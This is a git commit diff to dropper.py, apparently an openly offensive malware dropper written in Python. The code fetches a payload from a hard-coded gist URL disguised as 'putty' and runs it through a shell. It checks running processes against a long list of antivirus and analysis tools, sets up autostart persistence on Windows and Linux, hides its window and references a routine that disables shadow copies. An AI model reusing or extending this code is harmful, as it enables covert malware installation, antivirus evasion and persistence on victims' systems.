f304999b453e21cb3d7a1fad25026d5584c0065d
3v1l_un1c0rn <33223888+nico-duitsmann@users.noreply.github.com>
2018-12-18 16:55:04 +0100

    Update dropper.py

--- src/dropper/dropper.py
+++ src/dropper/dropper.py
@@ -4,11 +4,9 @@
 
 import base64
 import datetime
-import multiprocessing
 import os
 import platform
 import random
-import re
 import socket
 import string
 import subprocess
@@ -18,10 +16,12 @@ from urllib.request import urlopen
 
 import requests
 
+if platform.system().lower().startswith("win"):
+    import winreg as _winreg
 
-URL     = "https://gist.githubusercontent.com/nico-duitsmann/991cfe27d2042a844ca3be7217dbb845/raw/7d9a509cd707589b16176d704d66a542f9422d09/putty"
+URL = "https://gist.githubusercontent.com/nico-duitsmann/991cfe27d2042a844ca3be7217dbb845/raw/7d9a509cd707589b16176d704d66a542f9422d09/putty"
 VERSION = "cdrop1.0"
-AVLIST  = ['a2adguard.exe', 'a2adwizard.exe', 'a2antidialer.exe', 'a2cfg.exe', 'a2cmd.exe', 'a2free.exe', 'a2guard.exe', 'a2hijackfree.exe', 'a2scan.exe', 'a2service.exe', 'a2start.exe', 'a2sys.exe','a2upd.exe', 'aavgapi.exe', 'aawservice.exe', 'aawtray.exe', 'ad-aware.exe', 'ad-watch.exe', 'alescan.exe', 'anvir.exe', 'ashdisp.exe', 'ashmaisv.exe', 'ashserv.exe', 'ashwebsv.exe', 'aswupdsv.exe', 'atrack.exe', 'avgagent.exe', 'avgamsvr.exe', 'avgcc.exe', 'avgctrl.exe', 'avgemc.exe', 'avgnt.exe', 'avgtcpsv.exe', 'avguard.exe', 'avgupsvc.exe', 'avgw.exe', 'avkbar.exe', 'avk.exe', 'avkpop.exe', 'avkproxy.exe', 'avkservice.exe', 'avktray', 'avktray.exe', 'avkwctl', 'avkwctl.exe', 'avmailc.exe', 'avp.exe', 'avpm.exe', 'avpmwrap.exe', 'avsched32.exe', 'avwebgrd.exe', 'avwin.exe', 'avwupsrv.exe', 'avz.exe', 'bdagent.exe', 'bdmcon.exe', 'bdnagent.exe', 'bdss.exe', 'bdswitch.exe', 'blackd.exe', 'blackice.exe', 'blink.exe', 'boc412.exe', 'boc425.exe', 'bocore.exe', 'bootwarn.exe', 'cavrid.exe', 'cavtray.exe', 'ccapp.exe', 'ccevtmgr.exe', 'ccimscan.exe', 'ccproxy.exe', 'ccpwdsvc.exe', 'ccpxysvc.exe', 'ccsetmgr.exe', 'cfgwiz.exe', 'cfp.exe', 'clamd.exe', 'clamservice.exe', 'clamtray.exe', 'cmdagent.exe', 'cpd.exe', 'cpf.exe', 'csinsmnt.exe', 'dcsuserprot.exe', 'defensewall.exe', 'defensewall_serv.exe', 'defwatch.exe', 'f-agnt95.exe', 'fpavupdm.exe', 'f-prot95.exe', 'f-prot.exe', 'fprot.exe', 'fsaua.exe', 'fsav32.exe', 'f-sched.exe', 'fsdfwd.exe', 'fsm32.exe', 'fsma32.exe', 'fssm32.exe', 'f-stopw.exe', 'f-stopw.exe', 'fwservice.exe', 'fwsrv.exe', 'iamstats.exe', 'iao.exe', 'icload95.exe', 'icmon.exe', 'idsinst.exe', 'idslu.exe', 'inetupd.exe', 'irsetup.exe', 'isafe.exe', 'isignup.exe', 'issvc.exe', 'kav.exe', 'kavss.exe', 'kavsvc.exe', 'klswd.exe', 'kpf4gui.exe', 'kpf4ss.exe', 'livesrv.exe', 'lpfw.exe', 'mcagent.exe', 'mcdetect.exe', 'mcmnhdlr.exe', 'mcrdsvc.exe', 'mcshield.exe', 'mctskshd.exe', 'mcvsshld.exe', 'mghtml.exe', 'mpftray.exe', 'msascui.exe', 'mscifapp.exe', 'msfwsvc.exe', 'msgsys.exe', 'msssrv.exe', 'navapsvc.exe', 'navapw32.exe', 'navlogon.dll', 'navstub.exe', 'navw32.exe', 'nisemsvr.exe', 'nisum.exe', 'nmain.exe', 'noads.exe', 'nod32krn.exe', 'nod32kui.exe', 'nod32ra.exe', 'npfmntor.exe', 'nprotect.exe', 'nsmdtr.exe', 'oasclnt.exe', 'ofcdog.exe', 'opscan.exe', 'ossec-agent.exe', 'outpost.exe', 'paamsrv.exe', 'pavfnsvr.exe', 'pcclient.exe', 'pccpfw.exe', 'pccwin98.exe', 'persfw.exe', 'protector.exe', 'qconsole.exe', 'qdcsfs.exe', 'rtvscan.exe', 'sadblock.exe', 'safe.exe', 'sandboxieserver.exe', 'savscan.exe', 'sbiectrl.exe', 'sbiesvc.exe', 'sbserv.exe', 'scfservice.exe', 'sched.exe', 'schedm.exe', 'schedulerdaemon.exe', 'sdhelp.exe', 'serv95.exe', 'sgbhp.exe', 'sgmain.exe', 'slee503.exe', 'smartfix.exe', 'smc.exe','snoopfreesvc.exe', 'snoopfreeui.exe', 'spbbcsvc.exe', 'sp_rsser.exe', 'spyblocker.exe', 'spybotsd.exe', 'spysweeper.exe', 'spysweeperui.exe', 'spywareguard.dll', 'spywareterminatorshield.exe', 'ssu.exe', 'steganos5.exe', 'stinger.exe', 'swdoctor.exe', 'swupdate.exe', 'symlcsvc.exe','symundo.exe', 'symwsc.exe', 'symwscno.exe', 'tcguard.exe', 'tds2-98.exe', 'tds-3.exe', 'teatimer.exe', 'tgbbob.exe', 'tgbstarter.exe', 'tsatudt.exe', 'umxagent.exe', 'umxcfg.exe', 'umxfwhlp.exe', 'umxlu.exe', 'umxpol.exe', 'umxtray.exe', 'usrprmpt.exe', 'vetmsg9x.exe', 'vetmsg.exe','vptray.exe', 'vsaccess.exe', 'vsserv.exe', 'wcantispy.exe', 'win-bugsfix.exe', 'winpatrol.exe', 'winpa""rolex.exe', 'wrsssdk.exe', 'xcommsvr.exe', 'xfr.exe', 'xp-antispy.exe', 'zegarynka.exe', 'zlclient.exe']
+AVLIST = ['a2adguard.exe', 'a2adwizard.exe', 'a2antidialer.exe', 'a2cfg.exe', 'a2cmd.exe', 'a2free.exe', 'a2guard.exe', 'a2hijackfree.exe', 'a2scan.exe', 'a2service.exe', 'a2start.exe', 'a2sys.exe', 'a2upd.exe', 'aavgapi.exe', 'aawservice.exe', 'aawtray.exe', 'ad-aware.exe', 'ad-watch.exe', 'alescan.exe', 'anvir.exe', 'ashdisp.exe', 'ashmaisv.exe', 'ashserv.exe', 'ashwebsv.exe', 'aswupdsv.exe', 'atrack.exe', 'avgagent.exe', 'avgamsvr.exe', 'avgcc.exe', 'avgctrl.exe', 'avgemc.exe', 'avgnt.exe', 'avgtcpsv.exe', 'avguard.exe', 'avgupsvc.exe', 'avgw.exe', 'avkbar.exe', 'avk.exe', 'avkpop.exe', 'avkproxy.exe', 'avkservice.exe', 'avktray', 'avktray.exe', 'avkwctl', 'avkwctl.exe', 'avmailc.exe', 'avp.exe', 'avpm.exe', 'avpmwrap.exe', 'avsched32.exe', 'avwebgrd.exe', 'avwin.exe', 'avwupsrv.exe', 'avz.exe', 'bdagent.exe', 'bdmcon.exe', 'bdnagent.exe', 'bdss.exe', 'bdswitch.exe', 'blackd.exe', 'blackice.exe', 'blink.exe', 'boc412.exe', 'boc425.exe', 'bocore.exe', 'bootwarn.exe', 'cavrid.exe', 'cavtray.exe', 'ccapp.exe', 'ccevtmgr.exe', 'ccimscan.exe', 'ccproxy.exe', 'ccpwdsvc.exe', 'ccpxysvc.exe', 'ccsetmgr.exe', 'cfgwiz.exe', 'cfp.exe', 'clamd.exe', 'clamservice.exe', 'clamtray.exe', 'cmdagent.exe', 'cpd.exe', 'cpf.exe', 'csinsmnt.exe', 'dcsuserprot.exe', 'defensewall.exe', 'defensewall_serv.exe', 'defwatch.exe', 'f-agnt95.exe', 'fpavupdm.exe', 'f-prot95.exe', 'f-prot.exe', 'fprot.exe', 'fsaua.exe', 'fsav32.exe', 'f-sched.exe', 'fsdfwd.exe', 'fsm32.exe', 'fsma32.exe', 'fssm32.exe', 'f-stopw.exe', 'f-stopw.exe', 'fwservice.exe', 'fwsrv.exe', 'iamstats.exe', 'iao.exe', 'icload95.exe', 'icmon.exe', 'idsinst.exe', 'idslu.exe', 'inetupd.exe', 'irsetup.exe', 'isafe.exe', 'isignup.exe', 'issvc.exe', 'kav.exe', 'kavss.exe', 'kavsvc.exe', 'klswd.exe', 'kpf4gui.exe', 'kpf4ss.exe', 'livesrv.exe', 'lpfw.exe', 'mcagent.exe', 'mcdetect.exe', 'mcmnhdlr.exe', 'mcrdsvc.exe', 'mcshield.exe', 'mctskshd.exe', 'mcvsshld.exe', 'mghtml.exe', 'mpftray.exe', 'msascui.exe', 'mscifapp.exe', 'msfwsvc.exe', 'msgsys.exe', 'msssrv.exe', 'navapsvc.exe', 'navapw32.exe', 'navlogon.dll', 'navstub.exe', 'navw32.exe', 'nisemsvr.exe', 'nisum.exe', 'nmain.exe', 'noads.exe', 'nod32krn.exe', 'nod32kui.exe', 'nod32ra.exe', 'npfmntor.exe', 'nprotect.exe', 'nsmdtr.exe', 'oasclnt.exe', 'ofcdog.exe', 'opscan.exe', 'ossec-agent.exe', 'outpost.exe', 'paamsrv.exe', 'pavfnsvr.exe', 'pcclient.exe', 'pccpfw.exe', 'pccwin98.exe', 'persfw.exe', 'protector.exe', 'qconsole.exe', 'qdcsfs.exe', 'rtvscan.exe', 'sadblock.exe', 'safe.exe', 'sandboxieserver.exe', 'savscan.exe', 'sbiectrl.exe', 'sbiesvc.exe', 'sbserv.exe', 'scfservice.exe', 'sched.exe', 'schedm.exe', 'schedulerdaemon.exe', 'sdhelp.exe', 'serv95.exe', 'sgbhp.exe', 'sgmain.exe', 'slee503.exe', 'smartfix.exe', 'smc.exe', 'snoopfreesvc.exe', 'snoopfreeui.exe', 'spbbcsvc.exe', 'sp_rsser.exe', 'spyblocker.exe', 'spybotsd.exe', 'spysweeper.exe', 'spysweeperui.exe', 'spywareguard.dll', 'spywareterminatorshield.exe', 'ssu.exe', 'steganos5.exe', 'stinger.exe', 'swdoctor.exe', 'swupdate.exe', 'symlcsvc.exe', 'symundo.exe', 'symwsc.exe', 'symwscno.exe', 'tcguard.exe', 'tds2-98.exe', 'tds-3.exe', 'teatimer.exe', 'tgbbob.exe', 'tgbstarter.exe', 'tsatudt.exe', 'umxagent.exe', 'umxcfg.exe', 'umxfwhlp.exe', 'umxlu.exe', 'umxpol.exe', 'umxtray.exe', 'usrprmpt.exe', 'vetmsg9x.exe', 'vetmsg.exe', 'vptray.exe', 'vsaccess.exe', 'vsserv.exe', 'wcantispy.exe', 'win-bugsfix.exe', 'winpatrol.exe', 'winpa""rolex.exe', 'wrsssdk.exe', 'xcommsvr.exe', 'xfr.exe', 'xp-antispy.exe', 'zegarynka.exe', 'zlclient.exe']
 
 
 def hide_window():
@@ -37,7 +37,8 @@ def gen_random(size: int = 16):
 
 def setup_dropdir():
     dropdir = tempfile.gettempdir() + os.sep + gen_random()
-    if not os.path.exists(dropdir): os.makedirs(dropdir)
+    if not os.path.exists(dropdir):
+        os.makedirs(dropdir)
     return dropdir
 
 
@@ -78,7 +79,7 @@ class AutostartManager:
         def getfilename(name: str) -> str:
             _xdg_config_home = os.environ.get("XDG_CONFIG_HOME", "~/.config")
             _xdg_user_autostart = os.path.join(os.path.expanduser(_xdg_config_home),
-                    "autostart")
+                                               "autostart")
             return os.path.join(_xdg_user_autostart, name + ".desktop")
 
         @staticmethod
@@ -88,16 +89,16 @@ class AutostartManager:
                 "Exec=%s\n"\
                 "Type=Application\n"\
                 "Terminal=false\n" % (name, application)
-            with open(getfilename(name), "w") as f:
+            with open(AutostartManager.Linux.getfilename(name), "w") as f:
                 f.write(desktop_entry)
 
         @staticmethod
         def exists(name: str) -> bool:
-            return os.path.exists(getfilename(name))
+            return os.path.exists(AutostartManager.Linux.getfilename(name))
 
         @staticmethod
         def remove(name: str):
-            os.unlink(getfilename(name))
+            os.unlink(AutostartManager.Linux.getfilename(name))
 
 
 class CDropException(Exception):
@@ -114,7 +115,8 @@ class Dropkit:
 
     @staticmethod
     def exec_cmd(cmd: str) -> bool:
-        proc = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        proc = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE,
+                                stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         out  = proc.stdout.read() + proc.stderr.read()
         if out:
             return True
@@ -171,7 +173,7 @@ class Dropkit:
 
     @staticmethod
     def is_process_running(pname: str) -> bool:
-        cmd =  "tasklist /v /fo csv | findstr /i {}"
+        cmd = "tasklist /v /fo csv | findstr /i {}"
         cmd = cmd.format(pname)
         if Dropkit.exec_cmd(cmd):
             return True
@@ -207,11 +209,6 @@ class Dropkit:
                 req_ports.append(port)
         return req_ports
 
-    @staticmethod
-    def add_autostart() -> bool:
-        """TODO: Posix support."""
-        if Dropkit.get_os().startswith("win"):
-            pass
 
     @staticmethod
     def disable_shadow_copies() -> int:
@@ -221,8 +218,7 @@ class Dropkit:
 
 class Dropper(object):
     def __init__(self, dropdir: str, crypter_url: str,
-                 autoclean: bool = False, mode: callable = None
-    ):
+                 autoclean: bool = False, mode: str = None):
         self._dropdir = dropdir
         self._crypter_url = crypter_url
         self._autoclean = autoclean
@@ -239,15 +235,11 @@ class Dropper(object):
             "run" : self.run
         }
 
-
         if self._mode is not None and self._mode in tuple(self._modes):
             self._modes[self._mode]()
 
     def installed(self) -> bool:
-        if os.path.isfile(self._installed_f):
-            return True
-        else:
-            return False
+        return os.path.isfile(self._installed_f)
 
     def install(self) -> bool:
         req = requests.get(self._crypter_url)
@@ -264,7 +256,7 @@ class Dropper(object):
         self._final_dest = dest
         with open(self._installed_f, "w") as f:
             f.write(VERSION + "\n")
-            f.write(datetime.datetime.today().strftime("%Y-%m-%d") + "\n")
+            f.write(datetime.datetime.today().strftime("%Y-%m-%d %H:%M:%S") + "\n")
             f.write("?" + self._final_dest)
 
         Dropkit.exec_cmd(dest)
@@ -302,8 +294,7 @@ class Dropper(object):
                 ["taskmgr.exe", "procexp.exe", "regedit.exe", "msconfig.exe", "cmd.exe"]
             for cp in critical_processes:
                 if Dropkit.is_process_running(cp):
-                    import winreg as _winreg
-                    Dropkit.add_autostart()
+                    AutostartManager.Windows.add(gen_random(), os.path.abspath(sys.argv[0]))
                     sys.exit(0)
 
         while Dropkit.has_connection():
